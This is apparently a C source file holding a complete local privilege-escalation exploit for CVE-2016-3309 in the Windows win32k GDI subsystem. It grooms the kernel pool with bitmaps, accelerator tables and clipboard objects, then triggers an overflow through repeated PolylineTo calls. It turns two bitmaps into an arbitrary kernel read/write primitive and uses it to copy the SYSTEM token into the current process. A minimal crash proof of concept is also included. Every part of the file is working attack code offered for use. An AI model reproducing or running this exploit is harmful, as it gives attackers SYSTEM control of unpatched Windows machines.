#include "CVE-2016-3309.h"

HBITMAP g_hWorker_2016_3309 = NULL, g_hManager_2016_3309 = NULL;
PULONG64 pBuf_2016_3309 = NULL;

BOOL Exploit_CVE_2016_3309()
{
	BOOL bRet = TRUE;

	if (!Init_CVE_2016_3309())
	{
		bRet = FALSE;
		goto exit;
	}

	if (!EnablePrivilege_CVE_2016_3309())
	{
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

BOOL EnablePrivilege_CVE_2016_3309()
{
	BOOL bRet = TRUE;
	CONST DWORD dwTokenOffset = 0x358, dwLinkOffset = 0x2F0, dwPIDOffset = 0x2E8;
	ULONG64 ulSystemToken = 0, ulEprocess = 0;

	ulEprocess = GetSystemEprocess_CVE_2016_3309();
	if (!ulEprocess)
	{
		bRet = FALSE;
		goto exit;
	}

	if (!BitMapRead_CVE_2016_3309(ulEprocess + dwTokenOffset,
		(PBYTE)&ulSystemToken,
		sizeof(ULONG64)))
	{
		bRet = FALSE;
		goto exit;
	}

	ULONG64 ulCurPID = GetCurrentProcessId(), ulPID = 0;

	do {
		if (!BitMapRead_CVE_2016_3309(ulEprocess + dwLinkOffset,
			(PBYTE)&ulEprocess, sizeof(ULONG64)))
		{
			bRet = FALSE;
			goto exit;
		}

		ulEprocess = ulEprocess - dwLinkOffset;

		if (!BitMapRead_CVE_2016_3309(ulEprocess + dwPIDOffset,
			(PBYTE)&ulPID, sizeof(ULONG64)))
		{
			bRet = FALSE;
			goto exit;
		}
	} while (ulPID != ulCurPID);

	if (!BitMapWrite_CVE_2016_3309(ulEprocess + dwTokenOffset, (PBYTE)&ulSystemToken, sizeof(ULONG64)))
	{
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

ULONG64 GetSystemEprocess_CVE_2016_3309()
{
	ULONG64 ulSystemAddr = GetSystemProcess();

	if (!ulSystemAddr)
	{
		goto exit;
	}

	ULONG64 ulSystemEprocess = 0;

	if (!BitMapRead_CVE_2016_3309(ulSystemAddr,
								  (PBYTE)&ulSystemEprocess,
								  sizeof(ULONG64)))
	{
		goto exit;
	}

exit:
	return ulSystemEprocess;
}

BOOL SetAddress_CVE_2016_3309(ULONG64 ulAddress)
{
	BOOL bRet = TRUE;

	pBuf_2016_3309[0xDF8 / 8] = ulAddress;

	if (SetBitmapBits(g_hWorker_2016_3309, 0x1000, pBuf_2016_3309) < 0x1000)
	{
		ShowError("SetBitmapBits", GetLastError());
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

BOOL BitMapRead_CVE_2016_3309(ULONG64 ulAddress, PBYTE pRes, DWORD dwSize)
{
	BOOL bRet = TRUE;

	if (!SetAddress_CVE_2016_3309(ulAddress))
	{
		bRet = FALSE;
		goto exit;
	}

	if (GetBitmapBits(g_hManager_2016_3309, dwSize, pRes) < dwSize)
	{
		ShowError("GetBitmapBits", GetLastError());
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

BOOL BitMapWrite_CVE_2016_3309(ULONG64 ulAddress, PBYTE pRes, DWORD dwSize)
{
	BOOL bRet = TRUE;

	if (!SetAddress_CVE_2016_3309(ulAddress))
	{
		bRet = FALSE;
		goto exit;
	}

	if (SetBitmapBits(g_hManager_2016_3309, dwSize, pRes) < dwSize)
	{
		ShowError("GetBitmapBits", GetLastError());
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

BOOL Init_CVE_2016_3309()
{
	BOOL bRet = TRUE;
	CONST DWORD dwBitNum = 5000, dwAccelNum = 5000, dwJunkNum = 2000;
	DWORD i = 0;
	HBITMAP hBitMap[dwBitNum + 5] = { 0 };
	HACCEL hAccel[dwAccelNum + 5] = { 0 };

	for (i = 0; i < dwJunkNum; i++)
	{
		// 0x8 * 0x6 + 0x20 + 0x10 = 0x30 + 0x20 + 0x10 = 0x60
		ACCEL accel[0x6] = { 0 };
		hAccel[i] = CreateAcceleratorTableA(accel, 0x6);
		if (!hAccel[i])
		{
			ShowError("CreateAcceleratorTableA", GetLastError());
			bRet = FALSE;
			goto exit;
		}
	}

	for (i = 0; i < dwBitNum; i++)
	{
		// 0xD30 * 1 * 8 / 8 = 0xD30
		// 0xD30 + 0x10 + 0x260 = 0xFA0
		hBitMap[i] = CreateBitmap(0xD30, 1, 1, 8, NULL);
		if (!hBitMap[i])
		{
			ShowError("CreateBitmap", GetLastError());
			bRet = FALSE;
			goto exit;
		}
	}

	for (i = 0; i < dwAccelNum; i++)
	{
		// 0x8 * 0x6 + 0x20 + 0x10 = 0x30 + 0x20 + 0x10 = 0x60
		ACCEL accel[0x6] = { 0 };
		hAccel[i] = CreateAcceleratorTableA(accel, 0x6);
		if (!hAccel[i])
		{
			ShowError("CreateAcceleratorTableA", GetLastError());
			bRet = FALSE;
			goto exit;
		}
	}

	for (i = 0; i < dwBitNum; i++)
	{
		// 释放0xFA0的BitMap对象
		if (!DeleteObject(hBitMap[i]))
		{
			ShowError("DeleteObject", GetLastError());
			bRet = FALSE;
			goto exit;
		}
		hBitMap[i] = NULL;
	}

	for (i = 0; i < dwBitNum; i++)
	{
		// 0xB9C + 0x14 + 0x10 = 0xBC0,占用其中的0xBC0
		// 这样释放BitMap对象获取的0xFA0内存就剩余0xFA0 - 0xBC0 = 0x3E0
		if (!CreateClipboard(0xB9C))
		{
			bRet = FALSE;
			goto exit;
		}
	}

	for (i = 0; i < dwBitNum; i++)
	{
		// 0x5C * 32 / 8 = 0x5C * 4 = 0x170
		// 0x170 + 0x10 + 0x260 = 0x3E0
		// 占用剩余的0x3E0内存
		hBitMap[i] = CreateBitmap(0x5C, 1, 1, 32, NULL);
		if (!hBitMap[i])
		{
			ShowError("CreateBitmap", GetLastError());
			bRet = FALSE;
			goto exit;
		}
	}

	for (i = 2000; i < 3000; i++)
	{
		// 释放部分页尾的0x60字节的内存，其中的某块用来保存漏洞申请的0x60内存
		if (!DestroyAcceleratorTable(hAccel[i]))
		{
			ShowError("DestroyAcceleratorTable", GetLastError());
			bRet = FALSE;
			goto exit;
		}
		hAccel[i] = NULL;
	}

	// 触发漏洞，占用释放加速表得到的0x60的尾部的内存页，然后向下一页内存进行写入
	if (!Trigger_CVE_2016_3309())
	{
		bRet = FALSE;
		goto exit;
	}

	PBYTE pBuffer = (PBYTE)VirtualAlloc((PVOID)0x100000000,
									    0x1000,
										MEM_COMMIT | MEM_RESERVE,
										PAGE_READWRITE);
	if (!pBuffer)
	{
		ShowError("VirtualAlloc", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	*(pBuffer + 0x38) = 1;
	
	pBuf_2016_3309 = (PULONG64)malloc(0x1000);
	if (!pBuf_2016_3309)
	{
		bRet = FALSE;
		ShowError("malloc", GetLastError());
		goto exit;
	}

	ZeroMemory(pBuf_2016_3309, 0x1000);

	for (i = 0; i < dwBitNum; i++)
	{
		if (GetBitmapBits(hBitMap[i], 0x1000, pBuf_2016_3309) > 0x170)
		{
			g_hWorker_2016_3309 = hBitMap[i];
			g_hManager_2016_3309 = hBitMap[i + 1];
			break;
		}
	}
	
	if (!g_hWorker_2016_3309 || !g_hManager_2016_3309)
	{
		printf("not find BitMap\n");
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

BOOL Trigger_CVE_2016_3309()
{
	CONST DWORD dwCount = 0x3FE01;
	BOOL bRet = TRUE;
	static POINT points[dwCount];
	HDC hdc = NULL, hMemDC = NULL;
	HBITMAP bitmap = NULL;
	HGDIOBJ bitobj = NULL;
	DWORD i = 0;

	for (i = 0; i < dwCount; i++)
	{
		points[i].x = 0x5A1F;
		points[i].y = 0x5A1F;
	}

	points[2].y = 20;
	points[dwCount - 1].x = 0x4A1F;
	points[dwCount - 1].y = 0x6A1F;

	hdc = GetDC(NULL);
	if (!hdc)
	{
		ShowError("GetDC", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	hMemDC = CreateCompatibleDC(hdc);
	if (!hMemDC)
	{
		ShowError("CreateCompatibleDC", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	bitmap = CreateBitmap(0x5a, 0x1f, 1, 32, NULL);
	if (!bitmap)
	{
		ShowError("CreateBitmap", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	bitobj = (HGDIOBJ)SelectObject(hMemDC, bitmap);
	if (!bitobj)
	{
		ShowError("SelectObject", GetLastError());
		bRet = FALSE;
		goto exit;
	}


	if (!BeginPath(hMemDC))
	{
		ShowError("BeginPath", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	for (int j = 0; j < 0x156; j++)
	{
		if (j > 0x1F && points[2].y != 0x5A1F)	points[2].y = 0x5A1F;
		if (!PolylineTo(hMemDC, points, dwCount))
		{
			ShowError("PolylineTo", GetLastError());
			bRet = FALSE;
			goto exit;
		}
	}

	if (!EndPath(hMemDC))
	{
		ShowError("EndPath", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	FillPath(hMemDC);

exit:
	return bRet;
}

BOOL POC_CVE_2016_3309()
{
	BOOL bRet = TRUE;

	static POINT points[0x3fe01];
	points[0].x = 1;
	points[0].y = 1;
	// Get Device context of desktop hwnd
	HDC hdc = GetDC(NULL);
	// Get a compatible Device Context to assign Bitmap to
	HDC hMemDC = CreateCompatibleDC(hdc);
	// Create Bitmap Object
	HGDIOBJ bitmap = CreateBitmap(0x5a, 0x1f, 1, 32, NULL);
	// Select the Bitmap into the Compatible DC
	HGDIOBJ bitobj = (HGDIOBJ)SelectObject(hMemDC, bitmap);
	//Begin path
	BeginPath(hMemDC);
	// Calling PolylineTo 0x156 times with PolylineTo points of size 0x3fe01.
	for (int j = 0; j < 0x156; j++) {
		PolylineTo(hMemDC, points, 0x3FE01);
	}
	// End the path
	EndPath(hMemDC);
	// Fill the path
	FillPath(hMemDC);

	return bRet;
}